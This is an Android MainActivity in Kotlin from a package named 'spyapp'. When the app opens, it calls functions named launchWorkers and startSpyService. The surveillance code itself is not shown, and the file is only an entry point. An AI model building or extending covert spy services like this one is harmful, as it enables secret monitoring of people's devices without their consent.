package npo.kib.spyapp

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import npo.kib.spyapp.foreground.launchWorkers
import npo.kib.spyapp.foreground.startSpyService

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        launchWorkers()
        startSpyService()
    }
}